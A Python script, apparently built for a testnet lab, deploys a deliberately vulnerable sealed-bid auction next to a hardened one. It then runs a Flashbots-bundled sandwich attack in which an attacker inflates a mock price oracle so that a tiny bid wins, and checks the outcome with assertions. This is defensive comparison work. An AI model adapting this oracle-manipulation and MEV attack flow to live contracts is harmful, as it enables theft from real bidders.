#!/usr/bin/env python3
"""
auctionwithspot_native_eth.py
Single orchestrator script to:
 - deploy auctions (via DeployWithSpots forge script)
 - perform commit / reveal flow with attacker sandwich (via Flashbots)
 - finalize auctions and run assertions

This version is **Native ETH ONLY** and has removed all ERC20 token logic.

Environment variables (required):
 - RPC_URL
 - PRIVATE_KEY_DEPLOYER, PRIVATE_KEY_ALICE, PRIVATE_KEY_ATTACKER (hex private keys, 0x...)
 - FORGE_CMD (optional, default "forge")
 - PRICE_ORACLE_ADDRESS (mock with setPrice)
 - FLASHBOTS_ENABLED (true/false)
 - FLASHBOTS_SIGNER_PRIVKEY (if FLASHBOTS_ENABLED)
 - CHAIN_ID (optional, default 11155111)

Run:
 source venv/Scripts/activate
 python auctionwithspot_native_eth.py
"""

import os, json, time, subprocess
from dotenv import load_dotenv
from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware
from eth_account import Account
from flashbot_helper import FlashbotHelper
from pathlib import Path

load_dotenv()

# ----------------------
# Config from env
# ----------------------
RPC_URL = os.environ["RPC_URL"]
FORGE_CMD = os.environ.get("FORGE_CMD", "forge")
CHAIN_ID = int(os.environ.get("CHAIN_ID", "11155111"))

PRIVATE_KEY_DEPLOYER = os.environ["PRIVATE_KEY_DEPLOYER"]
PRIVATE_KEY_ALICE = os.environ["PRIVATE_KEY_ALICE"]
PRIVATE_KEY_ATTACKER = os.environ["PRIVATE_KEY_ATTACKER"]

PRICE_ORACLE_ADDR = os.environ.get("PRICE_ORACLE_ADDRESS", "")
FLASHBOTS_ENABLED = os.environ.get("FLASHBOTS_ENABLED", "false").lower() in ("1","true","yes")
FLASHBOTS_SIGNER = os.environ.get("FLASHBOTS_SIGNER_PRIVKEY", None)
FLASHBOTS_RELAY = os.environ.get("FLASHBOTS_RELAY", "https://relay-sepolia.flashbots.net")

# Minimal ABIs (expand if you need more functions)

PRICE_ORACLE_ABI = [
    {"inputs":[{"internalType":"uint256","name":"_price","type":"uint256"}],"name":"setPrice","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"getPrice","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
]


# ----------------------
# web3 + accounts
# ----------------------
w3 = Web3(HTTPProvider(RPC_URL))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

if not w3.is_connected():
    raise SystemExit("Web3 connection failed. Check RPC_URL and network stability.")

print(f"Connected to chain ID {w3.eth.chain_id} at block {w3.eth.block_number}")

deployer = Account.from_key(PRIVATE_KEY_DEPLOYER)
alice = Account.from_key(PRIVATE_KEY_ALICE)
attacker = Account.from_key(PRIVATE_KEY_ATTACKER)

print("Deployer:", deployer.address)
print("Alice:", alice.address)
print("Attacker:", attacker.address)
fb = None
if FLASHBOTS_ENABLED:
    if not FLASHBOTS_SIGNER:
        raise SystemExit("FLASHBOTS_ENABLED=true but FLASHBOTS_SIGNER_PRIVKEY not set")
    fb = FlashbotHelper(rpc_url=RPC_URL, relay_url=FLASHBOTS_RELAY, searcher_privkey=FLASHBOTS_SIGNER)

# ----------------------
# Helpers
# ----------------------
def run_forge_script_and_extract_addresses(script_name="DeployWithSpot"):
    """
    Run a forge script that deploys auctions and returns (vuln, hard) by return values.
    We run: forge script script/DeployWithSpots.s.sol:DeployWithSpots --rpc-url ...
    Parse stdout for console.log lines or fallback to broadcast JSON.
    """
    cmd = f"{FORGE_CMD} script script/{script_name}.s.sol:{script_name} --rpc-url {RPC_URL} --broadcast"
    print("Running script command:", cmd)
    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                          text=True, encoding="utf-8", errors="replace", env={**os.environ, "PYTHONIOENCODING":"utf-8"})
    out = proc.stdout or ""
    print(out)

    if proc.returncode != 0:
        raise SystemExit(f"Forge script failed (exit {proc.returncode}). See output above.")

    # Try parse console log (pattern: "Vulnerable Auction deployed at:" or "VULN_AUCTION_ADDR")
    vuln_addr, hard_addr = None, None
    for line in out.splitlines():
        if "Vulnerable Auction deployed at" in line or "VULN_AUCTION_ADDR" in line:
            vuln_addr = line.split()[-1].strip()
        if "Hardened Auction deployed at" in line or "HARDENED_AUCTION_ADDR" in line:
            hard_addr = line.split()[-1].strip()

    # Fallback to broadcast JSON
    if not vuln_addr or not hard_addr:
        import glob
        for f in glob.glob("broadcast/**/*run-latest.json", recursive=True) + glob.glob("broadcast/*/*/run-latest.json"):
            try:
                data = json.load(open(f))
            except Exception:
                continue
            for tx in data.get("transactions", []):
                if tx.get("contractAddress"):
                    c = tx["contractAddress"]
                    if not vuln_addr:
                        vuln_addr = c
                    elif not hard_addr and c != vuln_addr:
                        hard_addr = c
            if vuln_addr and hard_addr:
                break
    if not vuln_addr or not hard_addr:
        raise SystemExit("Could not parse deployed addresses from forge output or broadcast JSON")

    return Web3.to_checksum_address(vuln_addr), Web3.to_checksum_address(hard_addr)

def get_eip1559_fees(priority_gwei=2):

    MAX_FEE_CAP_GWEI = 500 # Safe cap to prevent RPC error

    """
    Calculates EIP-1559 maxFeePerGas and maxPriorityFeePerGas.
    We set a generous priority fee (bribe) to ensure inclusion for the Flashbots scenario.
    """
    # 2 Gwei base priority fee is standard for a good bribe
    max_priority_fee = w3.to_wei(priority_gwei, 'gwei')

    try:
        # Fetch the base fee from the latest block
        latest_block = w3.eth.get_block('latest')
        base_fee = latest_block.get('baseFeePerGas')

        if base_fee is None:
             # Fallback for non-EIP1559 chains or if field is missing (should not happen on Sepolia/Goerli)
             print("Warning: baseFeePerGas missing. Falling back to legacy gasPrice.")
             return w3.eth.gas_price, None, True

        # Max Fee must cover the Base Fee + Max Priority Fee
        # A common robust formula is: 2 * Base Fee + Max Priority Fee
        max_fee = (2 * base_fee) + max_priority_fee
        max_fee_cap = w3.to_wei(MAX_FEE_CAP_GWEI, 'gwei')
        if max_fee > max_fee_cap:
             print(f"Warning: Calculated maxFeePerGas ({w3.from_wei(max_fee, 'gwei'):.2f} Gwei) exceeded cap. Capping at {MAX_FEE_CAP_GWEI} Gwei.")
             max_fee = max_fee_cap

        return max_fee, max_priority_fee, False

    except Exception as e:
        print(f"Error fetching EIP-1559 fees ({e}). Falling back to legacy gasPrice.")
        return w3.eth.gas_price, None, True


def build_and_sign_tx(function_call, from_account, value=0, gas=None, nonce=None):

    """
    Build, sign and return raw tx bytes (signed).
    function_call: Contract.function(...).buildTransaction(...) already prepared or function object + args passed in.
    Includes EIP-1559 logic for online use with Flashbots.
    """
    # Get the fee structure
    max_fee, max_priority_fee, use_legacy = get_eip1559_fees()

    tx_params = {
        "from": from_account.address,
        "nonce": w3.eth.get_transaction_count(from_account.address) if nonce is None else nonce,
        "value": value,
        "chainId": CHAIN_ID
    }
    if use_legacy:
        # Legacy transaction (if EIP-1559 fails or is not supported)
        tx_params["gasPrice"] = max_fee # max_fee holds the gasPrice here
    else:
        # EIP-1559 transaction
        tx_params["maxFeePerGas"] = max_fee
        tx_params["maxPriorityFeePerGas"] = max_priority_fee

    tx = function_call.build_transaction(tx_params)

    if gas:
        tx["gas"] = gas
     # Estimate gas if missing

    if "gas" not in tx:
        try:
            tx["gas"] = w3.eth.estimate_gas(tx)
        except Exception as e:
            print(f"Gas estimation failed ({e}). Using fallback gas limit.")
            tx["gas"] = 1_000_000

    signed = from_account.sign_transaction(tx)
    return signed


def send_raw_and_wait(signed_tx):
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    print(f"Transaction submitted: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

    if receipt['status'] == 0:
        raise Exception(f"Transaction {tx_hash.hex()} REVERTED on-chain in block {receipt['blockNumber']}. Check logs/trace for details.")
    return w3.eth.wait_for_transaction_receipt(tx_hash)


def try_send_non_fatal(function_call, account, value, context_name, gas_limit=None):
    """
    Helper to attempt a transaction, catch the error if it fails, and allow the script to continue.
    Returns True if successful, False otherwise.
    """
    try:
        # We must fetch the nonce fresh every time a public transaction is attempted
        # because the Flashbots bundle attempt may have consumed nonces.
        fresh_nonce = w3.eth.get_transaction_count(account.address)
        signed_tx = build_and_sign_tx(function_call, account, value=value, nonce=fresh_nonce, gas=gas_limit)
        send_raw_and_wait(signed_tx)
        print(f"  ✅ SUCCESS: {context_name} mined.")
        return True
    except Exception as e:
        import re
        tx_match = re.search(r'Transaction (0x[0-9a-fA-F]{64}) REVERTED', str(e))
        tx_hash = tx_match.group(1) if tx_match else 'unknown'
        print(f"  ❌ FAILURE: {context_name} failed. Reason: Transaction {tx_hash} REVERTED on-chain. Details: {e}")
        return False


# ----------------------
# Core scenario flow
# ----------------------
def main():
    # 1) Deploy auctions
    print("--- Deploy auctions via deploy script ---")
    vuln_addr, hard_addr = run_forge_script_and_extract_addresses("DeployWithSpot")
    print("VULN:", vuln_addr, "HARD:", hard_addr)
    with open("out/VulnerableSealedBidAuctionWithSpot.sol/VulnerableSealedBidAuctionWithSpot.json") as f:
        vuln_abi = json.load(f)["abi"]
    with open("out/HardenedSealedBidAuctionWithSpot.sol/HardenedSealedBidAuctionWithSpot.json") as f:
        hard_abi = json.load(f)["abi"]

    vuln = w3.eth.contract(address=vuln_addr, abi=vuln_abi)
    hard = w3.eth.contract(address=hard_addr, abi=hard_abi)
    print("Vuln contract functions:", [fn.fn_name for fn in vuln.all_functions()])

    if not PRICE_ORACLE_ADDR:
        raise SystemExit("PRICE_ORACLE_ADDRESS environment variable must be set for this script.")

    price_oracle = w3.eth.contract(address=Web3.to_checksum_address(PRICE_ORACLE_ADDR), abi=PRICE_ORACLE_ABI)
    print("Connected to PriceOracleMock at", PRICE_ORACLE_ADDR, "current price:", price_oracle.functions.getPrice().call())


    # --- Configuration of Bids ---
    # Alice (Victim) has the highest legitimate nominal bid
    ALICE_BID_AMOUNT = w3.to_wei(0.01, "ether")
    ALICE_NONCE_SECRET = Web3.keccak(text="secret-nonce-alice") # deterministic for test - bytes32

    # Attacker has a low nominal bid, designed to be inflated
    ATTACKER_BID_AMOUNT = w3.to_wei(0.0001, "ether") # VERY LOW nominal bid
    ATTACKER_NONCE_SECRET = Web3.keccak(text="secret-nonce-attacker")

    # Deposit must match deployed contract's depositAmount
    deposit_amount = w3.to_wei(0.001, "ether")


    # 2a) Alice commit (Highest legitimate bid)
    print("\n--- Alice (Victim) Commit ---")
    alice_commit_hash = Web3.solidity_keccak(["uint256","address","bytes32"], [ALICE_BID_AMOUNT, alice.address, ALICE_NONCE_SECRET])

    signed_commit_vuln_alice = build_and_sign_tx(vuln.functions.commit(alice_commit_hash), alice, value=deposit_amount)
    print(f"Sending Alice commit ({w3.from_wei(ALICE_BID_AMOUNT, 'ether')} ETH) to vulnerable auction...")
    send_raw_and_wait(signed_commit_vuln_alice)

    signed_commit_hard_alice = build_and_sign_tx(hard.functions.commit(alice_commit_hash), alice, value=deposit_amount)
    send_raw_and_wait(signed_commit_hard_alice)
    print("Alice committed to both auctions.")


    # 2b) Attacker commit (Lowest nominal bid)
    print("\n--- Attacker Commit ---")
    attacker_commit_hash = Web3.solidity_keccak(["uint256","address","bytes32"], [ATTACKER_BID_AMOUNT, attacker.address, ATTACKER_NONCE_SECRET])

    signed_commit_vuln_attacker = build_and_sign_tx(vuln.functions.commit(attacker_commit_hash), attacker, value=deposit_amount)
    print(f"Sending Attacker commit ({w3.from_wei(ATTACKER_BID_AMOUNT, 'ether')} ETH) to vulnerable auction...")
    send_raw_and_wait(signed_commit_vuln_attacker)

    signed_commit_hard_attacker = build_and_sign_tx(hard.functions.commit(attacker_commit_hash), attacker, value=deposit_amount)
    send_raw_and_wait(signed_commit_hard_attacker)
    print("Attacker committed to both auctions.")


    # Wait until we're in reveal phase
    commit_end_block = vuln.functions.commitEndBlock().call() # read commitEndBlock from contract
    print("commitEndBlock =", commit_end_block)

    print("\nWaiting for block > commitEndBlock (reveal phase)...")
    while True:
        current = w3.eth.block_number
        if current > commit_end_block + 1:
            print("Now in reveal phase at block", current)
            break
        time.sleep(12)

    # sanity: verify commits stored
    assert vuln.functions.commitments(alice.address).call() != b'\x00'*32, "alice commitment missing (unexpected)"
    assert vuln.functions.commitments(attacker.address).call() != b'\x00'*32, "attacker commitment missing (unexpected)"


    # 3)---------- Sandwich: build front, ATTACKER REVEAL, back (single unified block) ----------
    print("\n--- Starting Sandwich Attack on Vulnerable Auction ---")

    # Attacker manipulates the price (4x the original/stable price)
    P_STABLE = price_oracle.functions.getPrice().call() if price_oracle else None
    P_HIGH = w3.to_wei(0.04, "ether") # Artificially high price

    if price_oracle:
        print(f"Stable oracle price: {w3.from_wei(P_STABLE, 'ether')} ETH. Inflated price: {w3.from_wei(P_HIGH, 'ether')} ETH.")

    # Prepare nonces: explicit attacker nonces for deterministic ordering
    att_nonce = w3.eth.get_transaction_count(attacker.address)

    # 3a. Attacker front-run: set Price to P_HIGH (nonce = att_nonce)
    front_signed = None
    if price_oracle:
        front_signed = build_and_sign_tx(price_oracle.functions.setPrice(P_HIGH), attacker, nonce=att_nonce)
        att_nonce += 1 # Increment nonce for the next transaction

    # 3b. Attacker reveal: exploit the high price (nonce = att_nonce + 1)
    ATTACKER_GAS_LIMIT = 2_000_000
    attacker_reveal_signed = build_and_sign_tx(
        vuln.functions.reveal(ATTACKER_BID_AMOUNT, ATTACKER_NONCE_SECRET),
        attacker,
        value=ATTACKER_BID_AMOUNT,
        nonce=att_nonce + 1,
        gas=ATTACKER_GAS_LIMIT
    )
    print(f"Attacker's effective bid will be calculated using nominal bid {w3.from_wei(ATTACKER_BID_AMOUNT, 'ether')} * inflated price {w3.from_wei(P_HIGH, 'ether')}")
    att_nonce += 1 # Increment nonce for the next transaction

    # 3c. Attacker reveal: HARDENED auction (nonce = att_nonce)
    attacker_reveal_hard_signed = build_and_sign_tx(
        hard.functions.reveal(ATTACKER_BID_AMOUNT, ATTACKER_NONCE_SECRET), 
        attacker, 
        value=ATTACKER_BID_AMOUNT, 
        nonce=att_nonce,
        gas=ATTACKER_GAS_LIMIT
    )
    print(f"Attacker reveal HARDENED (Nonce {att_nonce}): should REVERT due to price check.")
    att_nonce += 1 # Increment nonce for the next transaction

    # 3d. Attacker back-run: reset Price to P_STABLE (nonce = att_nonce + 2)
    back_signed = None
    if price_oracle:
        back_signed = build_and_sign_tx(price_oracle.functions.setPrice(P_STABLE), attacker, nonce=att_nonce + 2)

    # 4) Send bundle via Flashbots
    bundle = []
    if front_signed:
        bundle.append(front_signed.rawTransaction)
    bundle.append(attacker_reveal_signed.rawTransaction)
    bundle.append(attacker_reveal_hard_signed.rawTransaction)
    if back_signed:
        bundle.append(back_signed.rawTransaction)

    def try_flashbots_bundle(bundle_bytes_list, attempt_blocks=3, offset=1):
        for i in range(attempt_blocks):
            target_block = w3.eth.block_number + offset + i
            try:
                print(f"  Sending bundle to Flashbots for target block {target_block} (attempt {i+1}/{attempt_blocks})")
                res = fb.send_bundle(bundle_bytes_list, target_block_number=target_block)
                print("  Flashbots send returned. Waiting for inclusion...")
                receipt = res.wait() # blocking

                if receipt:
                    if receipt['status'] == 0:
                        print(f"  Warning: Bundle included in block {receipt['blockNumber']} but one or more TXs REVERTED (Status 0).")
                        # This should be treated as a failure for the attack, but the script must continue.
                        return False

                    print(f"  Bundle included in block {receipt['blockNumber']}")
                    return True

            except Exception as e:
                # Catch communication or submission errors
                print(f"  Flashbots send failed or inclusion check error (will retry next block): {e}")
                time.sleep(13)
                continue
        return False

    bundle_included = False
    if FLASHBOTS_ENABLED and fb:
        bundle_included = try_flashbots_bundle(bundle, attempt_blocks=3, offset=1)
        if bundle_included:
            print("Bundle submitted via Flashbots and included. **Attacker has won the vulnerable auction.**")
        else:
            print("Bundle sent but not included in target blocks (or send failed). Proceeding with public Alice reveal.")

    # 5a) Alice's Public Reveal (happens outside the sandwich)
    print("\n--- Alice Public Reveal on Vulnerable Auction ---")
    alice_revealed = vuln.functions.revealed(alice.address).call()
    current_block = w3.eth.block_number
    reveal_end_block = vuln.functions.revealEndBlock().call()

    ALICE_GAS_LIMIT = 2_000_000

    if not alice_revealed and current_block <= reveal_end_block:
        print(f"Attempting Alice's public reveal (Current block: {current_block}, End block: {reveal_end_block})...")
        try_send_non_fatal(
            vuln.functions.reveal(ALICE_BID_AMOUNT, ALICE_NONCE_SECRET),
            alice,
            value=ALICE_BID_AMOUNT,
            context_name="Alice's public reveal on VULNERABLE contract",
            gas_limit=ALICE_GAS_LIMIT
        )
    elif alice_revealed:
        print("Alice already revealed on VULNERABLE contract (state check confirmed).")
    else:
        print("Reveal window already passed; Alice cannot reveal publicly.")


    # 5b) Attacker reveals on Hardened Auction (Normal Flow)
    print("\n--- Attacker Reveal on Hardened Auction (Normal Flow) ---")
    attacker_revealed_hard = hard.functions.revealed(attacker.address).call()
    if not attacker_revealed_hard and current_block <= reveal_end_block:
        try_send_non_fatal(
            hard.functions.reveal(ATTACKER_BID_AMOUNT, ATTACKER_NONCE_SECRET),
            attacker,
            value=ATTACKER_BID_AMOUNT,
            context_name="Attacker's reveal on HARDENED contract",
            gas_limit=ALICE_GAS_LIMIT
        )
    elif attacker_revealed_hard:
        print("Attacker already revealed on HARDENED contract.")


    # 5c) Alice reveals on Hardened Auction
    print("\n--- Alice Reveal on Hardened Auction (Normal Flow) ---")
    alice_revealed_hard = hard.functions.revealed(alice.address).call()
    if not alice_revealed_hard and current_block <= reveal_end_block:
        try_send_non_fatal(
            hard.functions.reveal(ALICE_BID_AMOUNT, ALICE_NONCE_SECRET),
            alice,
            value=ALICE_BID_AMOUNT,
            context_name="Alice's reveal on HARDENED contract",
            gas_limit=ALICE_GAS_LIMIT
        )
    elif alice_revealed_hard:
        print("Alice already revealed on HARDENED contract.")

    # 5d) Attacker reveals on Vulnerable Auction
    print("\n--- Attacker Reveal on Vulnerable Auction (Normal Flow) ---")
    if not bundle_included and current_block <= reveal_end_block:
        attacker_revealed_vuln = vuln.functions.revealed(attacker.address).call()
        if not attacker_revealed_vuln:
            try_send_non_fatal(
                vuln.functions.reveal(ATTACKER_BID_AMOUNT, ATTACKER_NONCE_SECRET), 
                attacker, 
                value=ATTACKER_BID_AMOUNT, 
                context_name="Attacker's public reveal on VULNERABLE contract",
                gas_limit=ALICE_GAS_LIMIT # Force high gas limit
                )
        else:
            print("Attacker already revealed on VULNERABLE contract.")

    # 6) Wait until reveal window closes
    reveal_end_block = vuln.functions.revealEndBlock().call()
    print("revealEndBlock =", reveal_end_block)
    print("\nWaiting for block > revealEndBlock (finalize phase)...")
    while True:
        current = w3.eth.block_number
        if current > reveal_end_block:
            print("Now past revealEndBlock at block", current)
            break
        time.sleep(5)

    # 7) Finalize both auctions (deployer does this)
    print("\n--- Finalizing Auctions ---")
    # Get fresh nonce for deployer
    deployer_nonce = w3.eth.get_transaction_count(deployer.address)

    print("Finalizing vulnerable auction...")
    finalize_tx_vuln = build_and_sign_tx(vuln.functions.finalize(), deployer, nonce=deployer_nonce)
    try:
        send_raw_and_wait(finalize_tx_vuln)
        print("Vulnerable auction finalized.")
    except Exception as e:
        print(f"Finalize VULNERABLE FAILED. This is non-fatal for assertions if state is already set: {e}")

    deployer_nonce += 1
    print("Finalizing hardened auction...")
    finalize_tx_hard = build_and_sign_tx(hard.functions.finalize(), deployer, nonce=deployer_nonce)
    try:
        send_raw_and_wait(finalize_tx_hard)
        print("Hardened auction finalized.")
    except Exception as e:
        print(f"Finalize HARDENED FAILED. This is non-fatal for assertions if state is already set: {e}")


    # 8) Assertions & snapshots
    print("\n--- Results and Assertions ---")
    run_record = {
        "vuln": vuln_addr,
        "hard": hard_addr,
        "alice": alice.address,
        "attacker": attacker.address,
        "alice_bid_amount": str(ALICE_BID_AMOUNT),
        "attacker_bid_amount": str(ATTACKER_BID_AMOUNT),
    }

    # Divergence check: winner/winningBid differences
    v_winner = vuln.functions.winner().call()
    h_winner = hard.functions.winner().call()
    v_bid = vuln.functions.winningBid().call()
    h_bid = hard.functions.winningBid().call()
    
    # Use call() for non-state-changing reads
    v_eff_bid_attacker = vuln.functions.getRevealedEffectiveBid(attacker.address).call()
    h_eff_bid_attacker = hard.functions.getRevealedEffectiveBid(attacker.address).call()
    
    print(f"Attacker Effective Bid (Vulnerable): {w3.from_wei(v_eff_bid_attacker, 'ether'):.8f} ETH")
    print(f"Attacker Effective Bid (Hardened):   {w3.from_wei(h_eff_bid_attacker, 'ether'):.8f} ETH")
    print("---")
    print(f"Vulnerable Winner: {v_winner} (Bid: {w3.from_wei(v_bid, 'ether')} ETH)")
    print(f"Hardened Winner:   {h_winner} (Bid: {w3.from_wei(h_bid, 'ether')} ETH)")
    
    
    # Assertions for a successful attack scenario
    # NOTE: Assertions only run if the flow successfully resulted in a divergence.
    # If the bundle failed and Alice's public reveal succeeded, the assertions below will FAIL (as expected).
    try:
        assert v_winner == attacker.address, "Assertion Failed: Attacker did not win the VULNERABLE auction."
        assert h_winner == alice.address, "Assertion Failed: Alice did not win the HARDENED auction."
        assert v_bid == ATTACKER_BID_AMOUNT, "Assertion Failed: Vulnerable winning nominal bid mismatch."
        assert h_bid == ALICE_BID_AMOUNT, "Assertion Failed: Hardened winning nominal bid mismatch."
        
        diverged = (v_winner != h_winner) or (v_bid != h_bid)
        assert diverged, "Assertion Failed: Expected divergence between vulnerable and hardened auction outcomes."
        print("\nSuccess: Divergence confirmed. The sandwich attack was successful.")
    except AssertionError as e:
        print(f"\n--- ATTACK FAILURE SCENARIO ---")
        print(f"The attack failed. This means either the bundle was not included OR Alice's public reveal succeeded, overriding the attacker's win.")
        print(f"Failure Detail: {e}")


    run_record.update({
        "v_winner": v_winner,
        "h_winner": h_winner,
        "v_bid": str(v_bid),
        "h_bid": str(h_bid),
        "v_eff_bid_attacker": str(v_eff_bid_attacker),
        "h_eff_bid_attacker": str(h_eff_bid_attacker)
    })

    # Save run record
    Path("artifacts").mkdir(parents=True, exist_ok=True)
    with open("artifacts/run-record.json", "w") as fh:
        json.dump(run_record, fh, indent=2)

    print("Run complete. Saved artifacts/run-record.json")

if __name__ == "__main__":
    main()
